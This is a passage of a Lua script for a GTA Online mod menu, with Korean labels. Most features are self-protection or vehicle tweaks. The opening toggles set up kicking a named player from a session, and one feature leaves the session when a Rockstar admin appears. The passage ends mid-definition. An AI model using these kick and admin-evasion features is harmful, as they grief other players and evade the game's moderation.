menu.toggle(normalmeth, "크래쉬 V3", {"bkick3"}, "게임이 종료 될수 있고, 자신의 위험을 무릅쓰고", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_commands("nospawnactivities on")
        menu.trigger_commands("showtransitionstate on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_command(DontAsk, "on")
        util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_commands("nospawnactivities off")
        menu.trigger_commands("showtransitionstate off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_command(DontAsk, "off")
        util.toast("준비, 모두 해제.")
    end
end)

local testmeth = menu.list(bypasskick, "테스터의 방법", {}, "옵션에서 지시사항을 주의 깊게 읽으세요.")

menu.divider(testmeth, "단계 1", {}, "")

menu.toggle(testmeth, "활성화", {}, "이름을 선택하기 전에 이것을 활성화하십시오. \n3단계에서 비활성화", function(on)
    if on then
        menu.trigger_commands("bkick1 on")
    else
        menu.trigger_commands("bkick1 off")
    end
end)

menu.divider(testmeth, "단계 2", {}, "")

menu.text_input(testmeth, "이름 (Join)", {"name"}, "세션에 입장하려면. \n플레이어의 이름을 쓰세요.", function(playername)
    menu.trigger_commands("historyspectate".. playername)
end)

menu.divider(testmeth, "단계 3", {}, "")

menu.text_input(testmeth, "이름 (Kick)", {"name2"}, "그가 깨닫기 전에 그를 차기 위해. \n플레이어의 이름을 입력합니다.", function(playername)
    menu.trigger_commands("kick".. playername)
end)

menu.divider(testmeth, "방법 3", {}, "")
menu.action(testmeth, "데임 클릭", {}, "세션에 있고 세션을 찼을 때 여기를 클릭하십시오.", function()
    menu.trigger_commands("rejoin")
end)

--menu.action(testmeth, "Metodo en testeo", {}, "Este metodo no se ha probado previamente \nVa por pasos, estate atento", function()
--menu.trigger_commands("historyspectate" .. name)
--end)

--------------------------------------------------------------------------------------------------------------------------------
--Protecciones

menu.action(protects, "모든 소리를 정지", {"stopsounds"}, "", function()
    for i = -1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "휴대전화 벨 끄기", {}, "벨이 울리지 않게 휴대폰의 벨을 종료 합니다", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("nophonespam on")
    if AUDIO.IS_PED_RINGTONE_PLAYING(player) then
        for i = -1, 100 do
            AUDIO.STOP_PED_RINGTONE(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end

    end
    util.yield(1000)
    menu.trigger_commands("nophonespam off")
end)

local quitarf = menu.list(protects, "얼리기 해제")

menu.action(quitarf, "얼리기 제거 V1", {}, "원주민 몇 명을 리셋해서 프리제 상태를 없애도록 해", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "얼리기 제거 V2 'Test'", {}, "원주민 몇 명을 다시 시작해 보세요. 이 방법으로는 당신은 죽을 거예요.", function()
    local player = PLAYER.PLAYER_PED_ID()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, playerpos.x, playerpos.y, playerpos.z, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

menu.action(protects, "물건을 제거하다", {}, "그것은 당신에게 부착된 것들을 제거할 것입니다.", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(protects, "패닉 모드", {"panic"}, "이것은 어떤 대가를 치르더라도 모든 종류의 게임 이벤트를 제거하는 충돌 방지 모드를 렌더링합니다.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

menu.toggle(protects, "프리드리히 크래쉬", {}, "크래쉬에 걸리면 활성 크래쉬를 막도록 해", function(on_toggle)
    local player = PLAYER.PLAYER_PED_ID()
    --local lastpos = players.get_position(player)
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(player, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        --Fixing it next update
        --ENTITY.SET_ENTITY_COORDS(player, lastpos.x, lastpos.y, lastpos.z, 1, true)
        menu.trigger_commands("tpmaze")
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("크래쉬 방지를 미리 준비한자 :b")
    end
end)


menu.toggle_loop(protects, "R*의 지배하에 있다.", {}, "R*의 어드바이저가 감지되면 세션이 바뀝니다.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " 또 다른 세션이 있습니다.")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(protects, "트랜잭션 에러 차단", {}, "그것은 아마도 실수를 수반할 것이고, 책임하에 사용할 것", function(on_toggle)
--    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
--    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 300 do
            menu.trigger_commands("removeloader")
            util.yield(1000)
        end
--        --util.toast("No es mi culpa el error del log, esperen a que Stand lo arregle")
    end
end)

--menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
--    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
--    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
--    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
--end)

menu.toggle_loop(protects, "PFTX 입자를 차단합니다.", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "Anti 네발짐승", {}, "스탠드 등으로 짐승이 되는 것을 방지합니다.", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." 스타드 헌트 더 네발짐승 킬링 스크립트...")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)

menu.toggle(protects, "나를 안전하게 지켜줘", {"safeass"}, "그것은 당신을 안전한 상태로 유지하기 위해 원주민의 특정 부분을 사용합니다.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, 1269906701, true)
    util.yield(75)
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, -950858008, true)
    util.yield(75)
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "케이지 보호", {}, "")
local alpha = 160
menu.slider(anticage, "투명 케이지", {"cagealpha"}, "투명이기 때문에 눈에 보이지 안습니다.", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti 케이지", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                util.toast("그들은 당신을 케이지에 가두려고 해요.")
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

fmugger = menu.list(protects, "오브젝트/PED", {}, "")

local anti_mugger = menu.list(protects, "안티-강도")

menu.toggle_loop(anti_mugger, "미를 향해", {}, "머거스 차단은 당신을 향한 것입니다..", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("블록버스터 머거 프롬 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "다른 사람이요", {}, "머거스가 다른 사람을 공격한다.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("블락 머거 센티비 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

menu.toggle_loop(fmugger, "F/ 객체", {"ghostobjects"}, "물체와의 충돌을 무력화시킵니다.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(fmugger, "F/ 차량", {"ghostvehicles"}, "그것은 자동차와의 충돌을 무력화시킨다.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, veh_ptr in ipairs(entities.get_all_vehicles_as_pointers()) do
        local net_veh = memory.read_long(veh_ptr + 0xd0)
        local veh_handle = entities.pointer_to_handle(veh_ptr)
        ENTITY.SET_ENTITY_ALPHA(veh_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(veh_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(veh_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, veh_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(veh_handle)
    end
end)

local pool_limiter = menu.list(protects, "리미티드 풀", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "리미티드 풀/NPC", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "리미티드 풀/차량", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "리미티드 풀/객체", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
menu.slider(pool_limiter, "리미티드 풀/프로젝트", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

menu.toggle_loop(pool_limiter, "격려 리미티드 풀", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("NPC 볼 정리 중...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("차량 트렁크 청소 중...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("물건 봉투를 치우는 중...")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Coches
menu.toggle_loop(vehicles, "차량무적", {}, "대부분의 메뉴에서는 감지되지 않을 것입니다.", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "방향 지시등", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "차량 변경", {}, "")

--menu.click_slider_float(modificaciones, "Suspension", {"suspensionheight"}, "", -100, 100, 0, 1, function(value)
--    value/=100
--    local player = players.user_ped()
--    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x00D0, value)
--    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(VehicleHandle, pos.x, pos.y, pos.z + 2.8, false, false, false) -- Dropping vehicle so the suspension updates
--end)

--menu.click_slider_float(modificaciones, "Torque", {"torque"}, "", 0, 1000, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x004C, value)
--end)

--menu.click_slider_float(modificaciones, "Upshift", {"upshift"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x0058, value)
--end)

--menu.click_slider_float(modificaciones, "DownShift", {"downshift"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x005C, value)
--end)

--menu.click_slider_float(modificaciones, "Multiplicador De Curva", {"curve"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x0094, value)
--end)

menu.action(modificaciones, "랜덤 개량", {}, "수동으로 꺼내는 차량에서만 작동합니다.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("당신은 차에 있지 않아요. >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

menu.toggle_loop(modificaciones, "랜점 개량 (반복)", {}, "수동으로 꺼내는 차량에서만 작동합니다.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("당신은 차에 있지 않아요. >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "칸잘리 빠른 공격", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("칸잘리 안으로 들어가라.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

player_cur_car = 0

menu.toggle_loop(modificaciones, "방탄", {}, "모든 것을 승인하는 차량 상태를 생성합니다.", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

infcms = false
menu.toggle(modificaciones, "무한대 대응책", {"infinitecms"}, "끝없는 대응책을 강구하다.", function(on)
    infcms = on
end)

if player_cur_car ~= 0 then
    --if racemode then
    --    VEHICLE.SET_VEHICLE_IS_RACING(player_cur_car, true)
    --end

    if infcms then
        if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
            VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
        end
    end

    --if shift_drift then
    --    if PAD.IS_CONTROL_PRESSED(21, 21) then
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
    --        VEHICLE._SET_VEHICLE_REDUCE_TRACTION(player_cur_car, 0.0)
    --    else
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    --    end
    --end
end

--force_cm = false
--menu.toggle(vehicles, "Forzar Contramedidas", {"forcecms"}, "Fuerza las contramedidas en cualquier vehiculo a la tecla del claxon.", function(on)
--    force_cm = on
--    menu.trigger_commands("getgunsflaregun")
--end)

--if player_cur_car ~= 0 and force_cm then
--    if PAD.IS_CONTROL_PRESSED(46, 46) then
--        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(player_id), math.random(-5, 5), -30.0, math.random(-5, 5))
--        --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 300.0, true, -1355376991, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 100.0, true, 1198879012, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--    end
--end

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- Real Helicopter Mode Start

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

realheli = menu.list(vehicles, "헬리콥터", {}, "헬리콥터의 실제 제어 옵션")

menu.slider_float(realheli, "헬리콥터 엔진 파워", {"heliThrust"}, "헬리 파워", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("에러가 헬리에 들어간다")
    end
end)

menu.action(realheli, "실제 헬리콥터 모드", {"betterheli"}, "실제 작동 모드를 위해 수직 안정화를 비활성화합니다.", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("충돌하지 않도록 노력하십시오.")
    else
        util.toast("에러가 헬리에 들어간다")
    end
end)

-- Real Helicopter Mode End
--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "스포츠모드", {}, "임푸슬에 대해 우리 모두가 기억할 스포츠 모드 :'3")

PEDD = {
